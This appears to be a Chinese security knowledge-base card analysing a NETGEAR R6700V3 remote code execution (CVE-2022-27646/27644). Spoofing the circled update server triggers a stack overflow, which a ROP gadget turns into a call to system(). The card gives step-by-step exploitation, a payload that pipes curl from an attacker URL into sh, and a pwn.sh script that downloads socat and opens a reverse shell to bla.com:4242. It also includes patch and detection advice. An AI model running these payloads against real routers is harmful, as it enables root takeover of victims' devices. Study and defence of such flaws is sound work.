---
id: iot-netgear-r6700v3-circled-circleinfo-stack-overflow-rce
title: NETGEAR R6700V3 WAN 侧未授权 RCE（CVE-2022-27646/27644）：circled 以 curl -k 拉取 circleinfo.txt 栈溢出，gadget 调 system
type: scenario
domain: iot
path: iot
technique: netgear-circled-circleinfo-stack-overflow-rce
aliases:
- CVE-2022-27646
- CVE-2022-27644
- NETGEAR R6700V3 RCE
- circled 缓冲区溢出
- circleinfo.txt
- update server impersonation
tags:
- iot
- router
- netgear
- circled
- arm
- stack-overflow
- rop
- update-hijack
- rce
cve:
- CVE-2022-27646
- CVE-2022-27644
severity: critical
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: R6700v3-V1.0.4.120_10.0.91（原文分析的固件版本，/bin/circled SHA1 ac86472cdeccd01165718b1b759073b9e6b665e9）
verification:
  verified_by: verifier-V672
  verified_at: '2026-11-13T10:28:56+08:00'
  notes: 已对照原文与10-19图核对：affected_versions 中固件版本 R6700v3-V1.0.4.120_10.0.91 与 /bin/circled SHA1 ac86472cdeccd01165718b1b759073b9e6b665e9 与原文逐字一致；10图 updating_database(0xCE38) 的 line[1020]/db_checksum_val[256]/db_checksum[256]、fgets(line,1024)、sscanf("%s %s") 无宽度、11图 url_retrieve(0xC904) 拼接 curl -s -m 180 -k -o 且 system() 执行、12图官方 circleinfo.txt 内容、13图 1000A 测试文件、14图 loader exited, forking new loader now、15图 0xEC78 ldr r2,[sp,#132];add r0,r4,r2;bl system(0x94a0)、16图 saved_pc/saved_R4 payload 行、17图 260 个 a+分号+curl${IFS} 说明、18图 pwn.sh（socat 反弹 HOST=bla.com PORT=4242 + leddown/ledup）、19图补丁 sscanf("%255s %255s") 均一致；利用链（curl -k 冒充更新服务器→栈溢出→非 PIE gadget 调 system→堆地址爆破）有据。原文仅 LED 演示执行成功、无反弹 shell 交互截图，medium 置信度与卡内注明如实。dedup：候选含 Tenda/Synology sscanf 溢出等均为 new（不同设备/入口），无重复无删卡。未验证点：未复现。
---

## 一句话结论

NETGEAR R6700V3 默认启动的第三方家长控制守护程序 `/bin/circled` 会经 `url_retrieve()` 用 `curl -s -m 180 -k -o ...` 从更新服务器下载 `circleinfo.txt` 到 `/tmp`；`-k` 关闭证书校验，攻击者通过 DNS/TCP 重定向冒充更新服务器下发恶意文件即可触发 `updating_database()` 中 `sscanf(line, "%s %s", ...)` 对 256 字节栈缓冲区的无界写入，溢出保存的 `$R4`-`$R11`/`$PC`，利用非 PIE 代码段中的 `add r0, r4, r2; bl system` gadget 调用 `system()`，以 root 权限执行命令并反弹 shell（CVE-2022-27646、CVE-2022-27644）。

## 原理

- **circled 更新机制**：circled 为 Netgear 路由器启用家长控制，默认配置下启动；主程序 fork 出 loader，启动时检查更新、之后每两小时一次，崩溃后自动重启。`retrieve_circleinfo_txt`（0xE2D8）调用 `url_retrieve`（0xC904）下载数据库/引擎信息文件到 `/tmp/circleinfo.txt`。
- **下载不校验证书**：`url_retrieve` 拼接 `curl -s -m 180 -k -o <output> <server>/<path>` 并 `system()` 执行；`-k` 使 curl 忽略 TLS 证书错误，任何自签名证书都会被接受，因此能控制 DNS 或对更新服务器做 TCP 重定向（或本身就是 DHCP/DNS 服务器的攻击者）即可冒充官方更新服务器下发任意 `circleinfo.txt`。
- **解析栈溢出**：`updating_database`（0xCE38）打开 `/tmp/circleinfo.txt`，局部变量为 `char line[1020]; char db_checksum_val[256]; char db_checksum[256];`；循环 `while (fgets(line, 1024, f))` 后执行 `sscanf(line, "%s %s", db_checksum, db_checksum_val)`——`%s` 没有宽度限制，而单行最多 1024 字节，超出 256 字节的部分直接溢出栈；两个 256 字节缓冲区位于栈末尾附近，可覆盖保存的寄存器与返回地址。
- **触发验证**：构造含 1000 个 `A` + 空格 + `A` 的 `circleinfo.txt`，`/tmp/circledinfo.log` 显示 `loader exited, forking new loader now ...`，进程崩溃并在循环中重启。
- **利用约束**：目标 ARM，栈不可执行；二进制非 PIE（代码基址 0x8000）；`randomize_va_space=1`，堆位于数据段之后且地址确定，属于部分 ASLR。溢出通过格式字符串发生，除字符串末尾的终止空字节外不能写入空字节、空格或回车。
- **gadget**：在 `system` 附近找到 `0xEC78: ldr r2, [sp,#132]; add r0, r4, r2; bl system`。溢出可控制 `$R4`，从而控制 `system` 的第一个参数（`$R0 = R4 + R2`）；`$R2` 来自触发寄存器恢复的 `ret` 前所用格式字符串参数，原文测得恒为 `0xFFFF7954`。堆边界为 `0x1c000-0x21000`，加 `0x86ac` 后得到如 `0x000266ac` 的目标地址，该值需要以空字节结尾写入（字符串末尾可行）。
- **堆地址爆破**：命令字符串位于 `circleinfo.txt` 内容末尾（字符串开头会被后续堆分配覆盖）；攻击服务器对每个请求返回不同的文件，`saved_R4` 从 `0x246ac` 到 `0x296ac` 按 256 字节步进，覆盖堆上的可能位置。circled 内部计时器使每次尝试间隔 3-4 秒，但崩溃自动重启使爆破可无限重试，最终命中命令首字符。
- **payload 结构**：文件行由 260 个 `a` + `;` + 命令组成，后接 `<saved_pc>` 与 `<saved_R4>`；若 `$R0` 落在 `a` 串中任意位置，`system("a(...)a;curl${IFS}-k${IFS}https://A.B.C.D/exploit|sh;")` 会先执行不存在的 `a(...)a` 报错，再继续执行 curl 管道 shell，从而成功。
- **补丁**：官方从 curl 命令行删除 `-k`（阻止冒充更新服务器），并把解析器改为 `sscanf(line, "%255s %255s", ...)` 限制宽度。

## 触发条件

- 目标为 NETGEAR R6700V3（原文分析固件 `R6700v3-V1.0.4.120_10.0.91`），circled 默认启动并启用家长控制。
- 攻击者能影响路由器的 DNS 解析/流量路径（如处于上游网络、控制 DHCP/DNS，或对更新服务器做 TCP 重定向/中间人），使 `http.fw.updates1.netgear.com/sw-apps/parental-control/circle/r6700v3/https/circleinfo.txt` 指向自己的服务器。
- 攻击者可提供自签名 HTTPS 服务（curl `-k` 不校验证书）。
- 等待 circled 启动检查或两小时周期更新（崩溃后重启也会重新检查）；仅限授权测试。

## 利用步骤

1. **确认更新地址**：原文抓到的官方文件地址为 `https://http.fw.updates1.netgear.com/sw-apps/parental-control/circle/r6700v3/https/circleinfo.txt`，内容包含 `firmware_ver`、`database_ver`、`db_checksum` 等字段。
2. **搭环境**：让目标把该域名解析到攻击者（DNS 伺服/重定向），并以自签名证书提供 HTTPS 服务，返回构造的 `circleinfo.txt`。
3. **验证崩溃**：先返回 `A*1000 + " " + "A"`，观察 `/tmp/circledinfo.log` 出现 loader 退出并重启。
4. **爆破堆地址**：每次请求返回不同 `saved_R4`（`0x246ac`-`0x296ac`，步长 256）的 payload，`saved_pc` 指向 `0xEC78` gadget；payload 末尾放置 `curl${IFS}-k${IFS}https://attacker/exploit|sh;`。
5. **取 shell**：命中后 circled 以 root 执行 system 命令，下载并执行 `pwn.sh`（原文脚本下载 socat，反弹到 `HOST=bla.com`、`PORT=4242` 的 `exec:/bin/sh`，并循环 `leddown/ledup` 做灯光演示）。

## PoC

`circleinfo.txt` 漏洞行（原文）：

```text
AA(...)curl${IFS}-k${IFS}https://A.B.C.D/exploit|sh;<saved_pc> AA(...)curl${IFS}-k${IFS}https://A.B.C.D/exploit|sh;<saved_R4>
```

gadget（原文 objdump）：

```text
ec78:  e59d2084   ldr r2, [sp, #132]
ec7c:  e0840002   add r0, r4, r2
ec80:  ebffea06   bl  94a0        ; system
```

`pwn.sh` 核心：

```sh
HOST=bla.com
PORT=4242
curl -k https://${HOST}/s/socat -o /tmp/socat
chmod +x /tmp/socat
IP=$(ping -c1 ${HOST} | head -n1 | cut -d'(' -f2 | cut -d')' -f1)
/tmp/socat exec:/bin/sh,pty,stderr,setsid,sigint,sane tcp:${IP}:${PORT} &
while true; do leddown; sleep 1; ledup; sleep 1; done
```

原文通过 LED 灯光变化演示命令执行成功，未附反弹 shell 的交互截图，故置信度按 medium 处理。

## 变体与关联

- 变体：不控 DNS 时可通过 TCP 重定向/中间人替换 HTTPS 响应（curl `-k` 使其接受任意证书）；gadget 可替换为其他 `system` 调用点；命令受 `sscanf` 限制不能含空格/回车，可用 `${IFS}` 代替空格。
- 关联：[[iot-tplink-ac1750-tdpserver-onemesh-sync-server-stack-overflow-rce]]（同篇另一路由器利用链）、[[binary-pwn-stack-arm32-ret2win-backdoor-qemu]]（ARM32 栈溢出/返回地址覆盖基础）、[[binary-pwn-stack-tenda-ac15-setfirewallcfg-firewallen-strcpy-arm-rop]]（ARM 路由器 CGI 栈溢出）。
- 边界：补丁删除 `-k` 后冒充更新服务器需有效证书；`%255s` 限制后不再溢出。

## 检测与防御

- **修复**：升级 NETGEAR 固件（CVE-2022-27646/27644）；确认 circled 的 curl 不再使用 `-k`，解析器使用 `%255s` 宽度限制。
- **网络**：保证路由器 DNS 不被劫持；对更新域名启用可信解析/证书校验；监控异常 HTTPS 更新源与自签名证书。
- **检测**：`/tmp/circledinfo.log` 频繁出现 `loader exited, forking new loader now`；`/tmp/circleinfo.txt` 出现超长行/大量重复字符；circled 向外部地址下载脚本或发起反弹连接；LED 异常循环闪烁。
- **注意**：WAN 侧利用依赖更新通道劫持（DNS/TCP 重定向），与需要前置网络位置的攻击模型绑定；但一旦成功即为 root RCE。
